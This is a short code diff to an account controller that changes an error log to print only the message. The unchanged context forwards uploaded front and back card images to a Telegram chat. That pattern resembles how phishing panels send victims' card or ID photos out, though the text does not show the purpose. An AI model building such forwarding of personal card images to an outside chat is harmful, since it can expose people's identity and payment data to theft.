@@ -100,7 +100,7 @@ export class AccountController {
         frontCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, frontCard),
         backCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, backCard),
       ]).catch((err) => {
-        console.log("err", err);
+        console.log("err", err.message);
       });
 
       return res.status(200).json({
